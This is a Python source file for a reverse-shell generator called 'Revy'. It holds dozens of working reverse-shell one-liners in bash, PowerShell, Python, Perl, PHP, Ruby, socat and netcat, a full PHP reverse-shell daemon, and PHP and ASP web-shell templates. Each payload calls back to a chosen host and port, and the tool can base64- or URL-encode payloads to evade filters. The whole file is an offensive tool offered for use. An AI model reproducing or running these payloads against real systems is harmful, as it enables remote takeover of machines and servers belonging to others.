import subprocess, sys, base64, re
import urllib.parse, pyperclip

monkey = """<?php set_time_limit (0);$VERSION = "1.0";$ip = '^IP^';$port = ^PORT^;$chunk_size = 1400;$write_a = null;$error_a = null;$shell = '^SHELL^';$daemon = 0;$debug = 0;
if (function_exists('pcntl_fork')) { $pid = pcntl_fork(); if ($pid == -1) { printit("ERROR: Can't fork"); exit(1); } if ($pid) { exit(0);}
if (posix_setsid() == -1) { printit("Error: Can't setsid()"); exit(1); } $daemon = 1;} else { printit("WARNING: Failed to daemonise.This is quite common and not fatal.");}chdir("/");umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);if (!$sock) { printit("$errstr ($errno)"); exit(1);}$descriptorspec = array( 0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w") );$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) { printit("ERROR: Can't spawn shell"); exit(1);}stream_set_blocking($pipes[0], 0);stream_set_blocking($pipes[1], 0);stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);printit("Successfully opened reverse shell to $ip:$port");
while (1) { if (feof($sock)) { printit("ERROR: Shell connection terminated"); break; }if (feof($pipes[1])) { printit("ERROR: Shell process terminated"); break; }$read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
if (in_array($sock, $read_a)) { if ($debug) printit("SOCK READ"); $input = fread($sock, $chunk_size); if ($debug) printit("SOCK: $input"); fwrite($pipes[0], $input); }
if (in_array($pipes[1], $read_a)) { if ($debug) printit("STDOUT READ"); $input = fread($pipes[1], $chunk_size); if ($debug) printit("STDOUT: $input"); fwrite($sock, $input); }
if (in_array($pipes[2], $read_a)) { if ($debug) printit("STDERR READ"); $input = fread($pipes[2], $chunk_size); if ($debug) printit("STDERR: $input"); fwrite($sock, $input); }}
fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);function printit ($string) { if (!$daemon) { print "$string\\n"; }}?>"""

Revies = {
	"bash":"bash -c 'bash -i >& /dev/tcp/^IP^/^PORT^ 0>&1'",
	"sh":"sh -i >& /dev/tcp/^IP^/^PORT^ 0>&1",
	"zsh":"zsh -c 'zmodload zsh/net/tcp && ztcp ^IP^ ^PORT^ && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
	"/bin/bash":"/bin/bash -c '/bin/bash -i >& /dev/tcp/^IP^/^PORT^ 0>&1'",
	"/bin/sh":"/bin/sh -i >& /dev/tcp/^IP^/^PORT^ 0>&1",
	"/bin/zsh":"/bin/zsh -c 'zmodload zsh/net/tcp && ztcp ^IP^ ^PORT^ && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
	"busybox":"""busybox nc ^IP^ ^PORT^ -e /bin/sh""",
	"jenkins" : """String host="^IP^";int port=^PORT^;String cmd="bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();""",
	"powershell" :"""powershell.exe -NoP -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('^IP^', ^PORT^);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\"""",
	"powershell1":"""powershell.exe -NoP -exec bypass -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('^IP^',^PORT^);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"""",
	"powershell2":"""powershell.exe -NoP -NonI -W Hidden -Exec Bypass -c "New-Object System.Net.Sockets.TCPClient('^IP^',^PORT^);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"""",
	"python":"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("^IP^",^PORT^));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'""",
	"python2":"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("^IP^",^PORT^));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'""",
	"python21":"""export RHOST="^IP^";export RPORT=^PORT^;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'""",    
	"python3":"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("^IP^",^PORT^));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'""",
	"python31":"""export RHOST="^IP^";export RPORT=^PORT^;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'""",    
	"perl": """perl -e 'use Socket;$i="^IP^";$p=^PORT^;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""",
	"php":"""php -r '$sock=fsockopen("^IP^",^PORT^);exec("/bin/sh -i <&3 >&3 2>&3");'""",
	"php2":"""php -r '$sock=fsockopen("^IP^",^PORT^);shell_exec("sh <&3 >&3 2>&3");'""",
	"php3":"""php -r '$sock=fsockopen("^IP^",^PORT^);system("sh <&3 >&3 2>&3");'""",
	"php4":"""php -r '$sock=fsockopen("^IP^",^PORT^);passthru("sh <&3 >&3 2>&3");'""",
	"php5":"""php -r '$sock=fsockopen("^IP^",^PORT^);`sh <&3 >&3 2>&3`;'""",
	"php6":"""php -r '$sock=fsockopen("^IP^",^PORT^);popen("sh <&3 >&3 2>&3", "r");'""",
	"php7":"""php -r '$sock=fsockopen("^IP^",^PORT^);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'""",
	"ruby":"""ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("^IP^",^PORT^))'""",
	"rubynosh":"""ruby -rsocket -e'exit if fork;c=TCPSocket.new("^IP^","^PORT^");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'""",
	"socat":"""socat TCP:^IP^:^PORT^ EXEC:/bin/sh""",
	"socatty":"""socat TCP:^IP^:^PORT^ EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane""",
	"mkfifo":"""rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ^IP^ ^PORT^ >/tmp/f""",
	"nc":"""nc ^IP^ ^PORT^ -e /bin/sh""",
	"nc-c":"""nc -c /bin/sh ^IP^ ^PORT^""",
	"nc-e":"""nc ^IP^ ^PORT^ -e /bin/sh""",
	"nc.exe-e":"""nc.exe ^IP^ ^PORT^ -e /bin/sh""",
	}

def WebShelllist():
	print('\n\033[0;0;1mAvailable Shells:\033[0;0;0m\n')
	for w in WebShells:
		print(w)
	sys.exit(0)

WebShells = {
	"monkey" : monkey, 
	"phpticks" : """<?php `^REVY^`; ?>""",
	"phpexec" : """<?php exec('^REVY^');?>""",
	"phpsystem" : """<?php system('^REVY^');?>""",
	"phppassthru" : """<?php passthru('^REVY^');?>""",
	"phpshellexec" : """<?php shell_exec('^REVY^');?>""",
	"phppreg" : """<?php preg_replace("/.*/e", "system('^REVY^');", ""); ?>""",
	"asp" : """<%@ Page Language="C#" Debug="true" Trace="false" %><%@ Import Namespace="System.Diagnostics" %><%@ Import Namespace="System.IO" %><script Language="c#" runat="server">ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = "cmd.exe";psi.Arguments = '/c ^REVY^';psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;</script>"""
	
}

URLCharMap = {" ":"%20","!":"%21","\"":"%22","#":"%23","$":"%24","%":"%25","&":"%26","\'":"%27","(":"%28",")":"%29","*":"%2A","+":"%2B",",":"%2C","-":"%2D",".":"%2E","/":"%2F","0":"%30","1":"%31","2":"%32","3":"%33","4":"%34","5":"%35","6":"%36","7":"%37","8":"%38","9":"%39",":":"%3A",";":"%3B","<":"%3C","=":"%3D",">":"%3E","?":"%3F","@":"%40","A":"%41","B":"%42","C":"%43","D":"%44","E":"%45","F":"%46","G":"%47","H":"%48","I":"%49","J":"%4A","K":"%4B","L":"%4C","M":"%4D","N":"%4E","O":"%4F","P":"%50","Q":"%51","R":"%52","S":"%53","T":"%54","U":"%55","V":"%56","W":"%57","X":"%58","Y":"%59","Z":"%5A","[":"%5B","\\":"%5C","]":"%5D","^":"%5E","_":"%5F","`":"%60","a":"%61","b":"%62","c":"%63","d":"%64","e":"%65","f":"%66","g":"%67","h":"%68","i":"%69","j":"%6A","k":"%6B","l":"%6C","m":"%6D","n":"%6E","o":"%6F","p":"%70","q":"%71","r":"%72","s":"%73","t":"%74","u":"%75","v":"%76","w":"%77","x":"%78","y":"%79","z":"%7A","{":"%7B","|":"%7C","}":"%7D","~":"%7E"}


def getIP(interface):
	valid_host = re.compile(r'^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$|^(([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\-]*[a-zA-Z0-9])\.)+([A-Za-z]|[A-Za-z][A-Za-z0-9\-]*[A-Za-z0-9])$')

	if valid_host.match(interface):
		ip = interface
	else: 
		try:
			ip = (subprocess.check_output(['ifconfig', interface]).decode().split('inet')[1].split()[0].strip())
		except:
			print('[x] No Such Interface or Target.')
			sys.exit(0)
	return ip

def main(connection, revy, webshell = '', escape = [], space2cross = '', uencode = '', fuencode = '',bs64 = '', nohup = ''):
	try:
		interface = connection.split(":")[0].strip()
		port = connection.split(":")[1].strip()
	except IndexError:
		help()
	ip = getIP(interface)
	try:        
		revy = (Revies[revy].replace('^IP^', ip).replace('^PORT^', port))
	except KeyError:
		print('No Such Revie')
		sys.exit(0)
	if nohup != '':
		if re.search(r'powershell', revy):
			print("[x] You can't use -n flag on Windows.")
			sys.exit(0)
		else:
			revy = f"nohup {revy} &"
	if bs64 != '':
		if re.search(r'powershell', revy):
			splits = revy.split('"')
			revy = splits[0].replace('-c','-enc')+base64.b64encode(bytes(splits[1], 'utf=16LE')).decode('utf-8')
		else:
			revy = f'echo "{base64.b64encode(bytes(revy, "utf=8")).decode("utf-8")}"|base64 -d|sh'
	if webshell != '':
		if webshell == "monkey":
			revy = (monkey.replace('^SHELL^', sys.argv[2]).replace('^IP^', ip).replace('^PORT^', port))
		else:
			revy = (WebShells[webshell].replace('^REVY^', revy.replace("'", "\\'")))
	if len(escape) > 0:
		for e in escape:
				revy = revy.replace(e, '\\'+e)
	if uencode != '':
		revy = urllib.parse.quote(revy)
	if fuencode != '':
		rencoded = ''
		for cu in revy:
			cu = cu.replace(cu,URLCharMap[cu])
			rencoded += cu
		revy = rencoded
	if space2cross != '':
		revy = revy.replace(' ', "+")
	pyperclip.copy(revy.strip())
	print("[+] Revy copied to clipboard!")
	print(revy.strip())

def help():
	revies = ''
	c = 0
	for r in Revies:
		revies = revies + r + ', '
		c +=1
		if c == 8:
			revies = revies + '\n'
			c = 0
	webies = ''
	c = 0
	for r in WebShells:
		webies = webies + r + ', '
		c +=1
		if c == 8:
			webies = webies + '\n'
			c = 0
	print(f"""
\t\t\t\t✩\033[0;0;5m✩\033[0;0;0m✩ \033[1;34;49m𝐑𝐄𝐕𝐘\033[0;0;0m   ✩\033[0;0;5m✩\033[0;0;0m✩


\033[0;0;1mAvailable Shells:\033[0;0;0m

{revies.strip()[:-1]}


\033[0;0;1mAvailable WebShells:\033[0;0;0m

{webies.strip()[:-1]}


\033[0;0;1mOptional Flags:\033[0;0;0m

-w\tWebShell\t\t('-w list' For webshell list)
-n\tNohup
-b\tBase64 Encode
-e\tEscape Char\t\t(Comma Separated Values)
-u\tUrlEncode
-fu\tFull URL Encode\t\t( Thanks to 0KAMi93 )
-s\tSpace to Cross


\033[0;0;1mUsage:\033[0;0;0m 

revy tun0:1234 <shell>
revy 10.10.10.10:1234 <shell>
revy evildomain.com:1234 <shell>


\033[0;0;1mExamples:\033[0;0;0m 

revy eth0:1234 bash
revy eth0:1234 bash -w phpexec 
revy eth0:1234 powershell -w asp -b -s > rev.asp


\033[0;0;1mSimple Reverse Shell:\033[0;0;0m
""")
	main("eth0:1234", "bash")
	sys.exit(0)

if __name__ == '__main__':

	if len(sys.argv) >= 3: 
		webshell = ''; escape = ''; uencode = ''; fuencode = ''; bs64 = ''; space2cross = ''; nohup = ''
		for index in range(len(sys.argv)):

			if sys.argv[index] == '-w':
				if sys.argv[index+1] == 'list':
					WebShelllist()
				if sys.argv[index+1] in WebShells:
					webshell = sys.argv[index+1]
				else:
					print("[x] No Such WebShell.")
					sys.exit(0)
			if sys.argv[index] == '-e':
				try:
					escape = sys.argv[index+1]
				except IndexError:
					print("[x] Flag '-e': You need to specify at least one character to escape.")
					sys.exit(0)
			if sys.argv[index] == '-s':
				space2cross = '1'
			if sys.argv[index] == '-u':
				uencode = '1'
			if sys.argv[index] == '-fu':
				fuencode = '1'
			if sys.argv[index] == '-b':
				bs64 = '1'		
			if sys.argv[index] == '-n':
				nohup = '1'	
			if len(uencode+fuencode) > 1:
				print("[x] Flag '-u/-fu': You can't choose more than one URL encoding.")
				sys.exit(0)
		main(sys.argv[1],sys.argv[2],webshell,escape,space2cross,uencode,fuencode,bs64,nohup)
		
	else:
		help()
